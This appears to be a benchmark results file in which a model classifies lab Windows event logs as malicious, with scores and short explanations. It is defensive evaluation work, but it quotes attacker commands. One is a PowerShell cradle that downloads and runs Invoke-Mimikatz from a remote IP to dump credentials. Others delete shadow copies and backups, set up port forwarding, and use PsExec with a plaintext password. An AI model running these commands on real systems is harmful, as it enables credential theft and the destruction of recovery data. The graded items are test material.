+gpt-5.5-2026-04-23,"ID4688,4697,5140-5145 PSexec remote execution + admin share.evtx",easy,A,processed,YES,100.0,72.2,YES,"4624, 5140, 5145, 4674, 4697, 4688","PSEXESVC.exe, C:\Windows\System32\services.exe, %SystemRoot%\PSEXESVC.exe, C:\Windows\PSEXESVC.exe, C:\Windows\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe, C:\Windows\System32\HOSTNAME.EXE, C:\Windows\System32\cscript.exe, C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe","admmig, SRVDEFENDER01$, LocalSystem, demo\admmig","C:\Windows\PSEXESVC.exe, ""cmd.exe"" -u demo\admmig -p Admin1235 -accepteula , \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, whoami, hostname, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""","srvdefender01.offsec.lan, 10.23.42.22",,0.0,13.30,4.3,5.0,4.0,3,16.3,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4624, 5140, 5145, 4674, 4697, 4688
+- Processes: PSEXESVC.exe, C:\Windows\System32\services.exe, %SystemRoot%\PSEXESVC.exe, C:\Windows\PSEXESVC.exe, C:\Windows\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe, C:\Windows\System32\HOSTNAME.EXE, C:\Windows\System32\cscript.exe, C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe
+- Accounts: admmig, SRVDEFENDER01$, LocalSystem, demo\admmig
+- Commands: C:\Windows\PSEXESVC.exe, ""cmd.exe"" -u demo\admmig -p Admin1235 -accepteula , \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, whoami, hostname, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""
+- Network: srvdefender01.offsec.lan, 10.23.42.22
+- Registry: None
+
+EXPLANATION:
+The events show admmig logging on from 10.23.42.22, accessing \\*\ADMIN$ and \\*\IPC$, writing PSEXESVC.exe, creating the PSEXESVC service as LocalSystem, and launching C:\Windows\PSEXESVC.exe. The spawned C:\Windows\cmd.exe runs with a command line containing credentials and then executes whoami and hostname, matching PsExec-style remote execution behavior rather than routine activity."
+gpt-5.5-2026-04-23,ID13-RDP shadow session configuration enabled (registry).evtx,easy,A,processed,NO,100.0,88.9,YES,12,C:\Windows\system32\reg.exe,,,FS03.offsec.lan,HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services,0.0,13.21,5.3,1.0,4.0,2,12.3,C,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 12
+- Processes: C:\Windows\system32\reg.exe
+- Accounts: None
+- Commands: None
+- Network: FS03.offsec.lan
+- Registry: HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services
+
+EXPLANATION:
+Sysmon Event ID 12 shows C:\Windows\system32\reg.exe creating the registry key HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services, with the rule name referencing Remote Desktop Protocol. This is potentially suspicious, but the log contains only a single registry key creation with no command line, account, or related events showing malicious activity."
+gpt-5.5-2026-04-23,ID5600-proxy configuration changed.evtx,easy,A,processed,YES,100.0,71.4,YES,5600,,,,"hacker-proxy.lan, hacker-bypass.com, internal.lan",,0.0,10.95,4.3,6.0,4.0,2,16.3,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 5600
+- Processes: None
+- Accounts: None
+- Commands: None
+- Network: hacker-proxy.lan, hacker-bypass.com, internal.lan
+- Registry: None
+
+EXPLANATION:
+Repeated ProxyConfigChanged events show the proxy being set to http://hacker-proxy.lan:123 and the auto config URL being set to http://hacker-bypass.com/. The sequence also adds bypass entries including http://internal.lan and <local>, indicating suspicious proxy manipulation rather than routine activity."
+gpt-5.5-2026-04-23,ID4688-netsh RDP port forwarding abuse.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4964, 4672, 4624, 4627","C:\Windows\System32\netsh.exe, C:\Windows\System32\cmd.exe","admmig, FS01$","netsh  I p a v l=8001 listena=0.0.0.0 connectp=3389 c=1.1.1.1, netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=48333 connectaddress=127.0.0.1 connectport=80, netsh  interface portproxy reset","fs01.offsec.lan, 0.0.0.0, 1.1.1.1, 127.0.0.1, 10.23.23.9",,0.0,11.46,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4688, 4964, 4672, 4624, 4627
+- Processes: C:\Windows\System32\netsh.exe, C:\Windows\System32\cmd.exe
+- Accounts: admmig, FS01$
+- Commands: netsh  I p a v l=8001 listena=0.0.0.0 connectp=3389 c=1.1.1.1, netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=48333 connectaddress=127.0.0.1 connectport=80, netsh  interface portproxy reset
+- Network: fs01.offsec.lan, 0.0.0.0, 1.1.1.1, 127.0.0.1, 10.23.23.9
+- Registry: None
+
+EXPLANATION:
+The same account admmig cleared the Security log and then executed multiple netsh commands to configure and reset portproxy behavior. The sequence of log clearing, port forwarding commands, and a privileged network logon for admmig indicates malicious activity rather than routine administration."
+gpt-5.5-2026-04-23,ID4688-Delete VSS backup (WMI).evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\wbem\WMIC.exe, C:\Windows\System32\VSSVC.exe, C:\Windows\System32\svchost.exe","admmig, FS03$","wmic  shadowcopy delete /nointeractive, C:\Windows\system32\vssvc.exe, C:\Windows\System32\svchost.exe -k swprv",FS03.offsec.lan,,0.0,8.50,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4688
+- Processes: C:\Windows\System32\wbem\WMIC.exe, C:\Windows\System32\VSSVC.exe, C:\Windows\System32\svchost.exe
+- Accounts: admmig, FS03$
+- Commands: wmic  shadowcopy delete /nointeractive, C:\Windows\system32\vssvc.exe, C:\Windows\System32\svchost.exe -k swprv
+- Network: FS03.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The account admmig executed WMIC with the command wmic  shadowcopy delete /nointeractive on FS03.offsec.lan. This was immediately followed by VSSVC.exe and svchost.exe -k swprv activity, a pattern consistent with deleting Volume Shadow Copies to inhibit recovery."
+gpt-5.5-2026-04-23,ID4688-Delete Window backup (webadmin).evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688","C:\Windows\System32\wbadmin.exe, C:\Windows\System32\wbem\WMIADAP.exe, C:\Windows\System32\wbem\WmiPrvSE.exe","admmig, FS03$","wbadmin  delete backup -backupTarget:m:\ -deleteOldest, wmiadap.exe /R /T, C:\Windows\system32\wbem\wmiprvse.exe -Embedding",FS03.offsec.lan,,0.0,9.00,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4688
+- Processes: C:\Windows\System32\wbadmin.exe, C:\Windows\System32\wbem\WMIADAP.exe, C:\Windows\System32\wbem\WmiPrvSE.exe
+- Accounts: admmig, FS03$
+- Commands: wbadmin  delete backup -backupTarget:m:\ -deleteOldest, wmiadap.exe /R /T, C:\Windows\system32\wbem\wmiprvse.exe -Embedding
+- Network: FS03.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The Security log was cleared by admmig, followed shortly by execution of wbadmin  delete backup -backupTarget:m:\ -deleteOldest under the same account, indicating potential defense evasion and backup deletion. The WMI-related process launches under FS03$ also occurred in the same short time window, but the strongest malicious pattern is the log clearing paired with backup deletion."
+gpt-5.5-2026-04-23,ID800-4103-4104-Delete VSS backup (PowerShell).evtx,easy,A,processed,YES,100.0,91.7,YES,"800, 4104, 4103",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,OFFSEC\admmig,Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete() | },FS03.offsec.lan,,0.0,12.69,5.5,6.0,4.0,3,18.5,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 800, 4104, 4103
+- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+- Accounts: OFFSEC\admmig
+- Commands: Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
+- Network: FS03.offsec.lan
+- Registry: None
+
+EXPLANATION:
+PowerShell was used by OFFSEC\admmig to run Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}, which deletes Windows shadow copies. This behavior is malicious because removing shadow copies is commonly used to prevent recovery after destructive activity such as ransomware."
+gpt-5.5-2026-04-23,ID4728-4756-Member added to sensitive domain groups.evtx,easy,A,processed,YES,100.0,92.9,YES,"4728, 4756",,"CN=honey-pot1, OU=Test-OU, OU=OFFSEC-COMPANY, DC=offsec, DC=lan, Domain Admins, Enterprise Admins, Enterprise Key Admins, Schema Admins, lambda-user",,rootdc1.offsec.lan,,0.0,12.56,5.6,5.0,4.0,2,16.6,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4728, 4756
+- Processes: None
+- Accounts: CN=honey-pot1,OU=Test-OU,OU=OFFSEC-COMPANY,DC=offsec,DC=lan, Domain Admins, Enterprise Admins, Enterprise Key Admins, Schema Admins, lambda-user
+- Commands: None
+- Network: rootdc1.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The logs show lambda-user adding CN=honey-pot1,OU=Test-OU,OU=OFFSEC-COMPANY,DC=offsec,DC=lan to multiple highly privileged groups including Domain Admins, Enterprise Admins, Enterprise Key Admins, and Schema Admins. The same actor and logon session performing several rapid privileged group additions indicates privilege escalation rather than routine activity."
+gpt-5.5-2026-04-23,ID4103-4104-CrackMapExec payload execution.evtx,medium,A,processed,YES,100.0,58.3,YES,"4104, 4103",powershell.exe,OFFSEC\admmig,"powershell.exe -exec bypass -noni -nop -w 1 -C, Invoke-Expression, IEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1'), Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'","win10-02.offsec.lan, 10.23.123.11",,0.0,23.37,3.5,6.0,4.0,4,17.5,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4104, 4103
+- Processes: powershell.exe
+- Accounts: OFFSEC\admmig
+- Commands: powershell.exe -exec bypass -noni -nop -w 1 -C, Invoke-Expression, IEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1'), Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'
+- Network: win10-02.offsec.lan, 10.23.123.11
+- Registry: None
+
+EXPLANATION:
+The logs show powershell.exe launched with execution bypass and non-interactive/no-profile options, followed by obfuscated script execution and Invoke-Expression. The decoded command attempts to download Invoke-Mimikatz.ps1 from 10.23.123.11 and run Invoke-Mimikatz with privilege::debug and sekurlsa::logonpasswords, and the event reports that malicious content was blocked by antivirus software."
+gpt-5.5-2026-04-23,ID11-LSASS credentials dump via Task Manager.evtx,easy,A,processed,YES,100.0,100.0,YES,11,C:\Windows\System32\Taskmgr.exe,admmig,,fs03vuln.offsec.lan,,0.0,5.61,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 11
+- Processes: C:\Windows\System32\Taskmgr.exe
+- Accounts: admmig
+- Commands: None
+- Network: fs03vuln.offsec.lan
+- Registry: None
+
+EXPLANATION:
+Sysmon Event ID 11 shows C:\Windows\System32\Taskmgr.exe creating a dump file named C:\Users\admmig\AppData\Local\Temp\lsass (4).DMP. Creating an LSASS dump file is consistent with credential dumping behavior rather than routine activity."
+gpt-5.5-2026-04-23,ID6004-DNS-server-failed zone transfer.evtx,easy,A,processed,NO,100.0,100.0,YES,6004,,,,"rootdc1.offsec.lan, 10.23.23.9, non-existing.lan., google.com., hacking-zone.lan.",,0.0,15.97,6.0,1.0,4.0,2,13.0,C,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 6004
+- Processes: None
+- Accounts: None
+- Commands: None
+- Network: rootdc1.offsec.lan, 10.23.23.9, non-existing.lan., google.com., hacking-zone.lan.
+- Registry: None
+
+EXPLANATION:
+The events show repeated Microsoft-Windows-DNS-Server-Service Event ID 6004 entries involving 10.23.23.9 and queried names. There are no processes, accounts, commands, registry changes, or other correlated activity in the provided logs to establish attack behavior."
+gpt-5.5-2026-04-23,ID4704-4705-User righ assigned to account.evtx,easy,A,processed,YES,100.0,100.0,YES,"4704, 4705",,admmig,,fs02.offsec.lan,,0.0,7.37,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4704, 4705
+- Processes: None
+- Accounts: admmig
+- Commands: None
+- Network: fs02.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The logs show repeated paired assignment and removal of sensitive privileges by admmig, including SeCreateTokenPrivilege, SeAssignPrimaryTokenPrivilege, SeDebugPrivilege, and SeImpersonatePrivilege. This pattern of short-lived privilege changes on the same target identifier is suspicious and consistent with attack behavior rather than routine activity."
+gpt-5.5-2026-04-23,ID4688-5145-WMIexec execution via SMB.evtx,easy,A,processed,YES,100.0,75.0,YES,"1102, 4964, 4672, 4624, 4688, 4674, 5140, 5145","C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe","admmig, LOCAL SERVICE, FS03VULN$","cmd.exe /Q /c cd \ 1&gt | \\127.0.0.1\ADMIN$\__1619090610.0007844 2&gt | &amp | 1, \??\C:\Windows\system32\conhost.exe 0xffffffff, cmd.exe /Q /c cd  1&gt | 1","fs03vuln.offsec.lan, 10.23.23.9, 10.23.123.11, 127.0.0.1",,0.0,28.70,4.5,5.0,4.0,3,16.5,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4964, 4672, 4624, 4688, 4674, 5140, 5145
+- Processes: C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe
+- Accounts: admmig, LOCAL SERVICE, FS03VULN$
+- Commands: cmd.exe /Q /c cd \ 1&gt; \\127.0.0.1\ADMIN$\__1619090610.0007844 2&gt;&amp;1, \??\C:\Windows\system32\conhost.exe 0xffffffff, cmd.exe /Q /c cd  1&gt; \\127.0.0.1\ADMIN$\__1619090610.0007844 2&gt;&amp;1
+- Network: fs03vuln.offsec.lan, 10.23.23.9, 10.23.123.11, 127.0.0.1
+- Registry: None
+
+EXPLANATION:
+The logs show Security log clearing with Event ID 1102 by admmig, followed by repeated privileged logons and administrative share access using C$ and ADMIN$. Event ID 4688 shows cmd.exe commands redirecting output to \\127.0.0.1\ADMIN$\__1619090610.0007844, and later file access includes Users\admmig\Desktop\SMB exec.evtx, indicating remote SMB command execution and log/evidence handling rather than routine activity."
+gpt-5.5-2026-04-23,ID4688-4648 Lateral movement with net use.evtx,easy,A,processed,YES,100.0,100.0,YES,"4688, 4648",C:\Windows\System32\net.exe,"admmig, hack1",net  use m: \\fs03vuln\c$ /USER:offsec\hack1,"FS03.offsec.lan, fs03vuln.offsec.lan, fs03vuln",,0.0,11.94,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4688, 4648
+- Processes: C:\Windows\System32\net.exe
+- Accounts: admmig, hack1
+- Commands: net  use m: \\fs03vuln\c$ /USER:offsec\hack1
+- Network: FS03.offsec.lan, fs03vuln.offsec.lan, fs03vuln
+- Registry: None
+
+EXPLANATION:
+The events show admmig launching C:\Windows\System32\net.exe to connect to the administrative C$ share on \\fs03vuln\c$ using the alternate account offsec\hack1. This is paired with Event ID 4648 showing explicit credentials for hack1 to fs03vuln.offsec.lan, which is consistent with suspicious lateral access behavior."
